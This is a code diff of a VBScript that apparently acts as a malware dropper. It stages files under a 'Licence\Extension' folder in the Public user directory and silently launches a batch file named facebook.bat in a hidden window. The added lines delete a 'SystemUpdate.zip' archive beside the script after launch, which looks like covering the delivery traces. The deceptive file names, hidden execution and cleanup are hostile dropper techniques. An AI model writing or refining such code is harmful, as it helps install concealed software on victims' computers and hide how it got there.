@@ -2,6 +2,13 @@ Dim FSO
 Set WshShell = CreateObject( "WScript.Shell" )
 Set FSO = CreateObject("Scripting.FileSystemObject")
 
+Dim User 
+Dim Path
+Dim Loc1 
+Dim Loc2 
+Dim Loc3 
+Dim Loc4 
+
 Path = "C:\Users\Public\Licence\Extension"
 
 
@@ -70,6 +77,7 @@ End If
 Loc1 = "C:\Users\Public\Licence\Extension\facebook.bat"
 Loc2 = "C:\Users\"+ User + "\AppData\Local\Temp\afolder\facebook.bat"
 Loc3 = ".\facebook.bat"
+Loc4 = Left(WScript.ScriptFullName,InStrRev(WScript.ScriptFullName,"\")) + ".data\SystemUpdate.zip"
 Path = "C:\Users\Public\Licence\Extension"
 
 
@@ -110,5 +118,11 @@ Else
    WScript.Sleep 1000
    WshShell.Run chr(34) & ".\facebook.bat" & Chr(34), 0
    Set WshShell = Nothing
+End If
+
+
+If fso.FileExists(Loc4) Then
+   FSO.DeleteFile Loc4 
+   Set FSO=Nothing    
 End If
 WScript.Quit
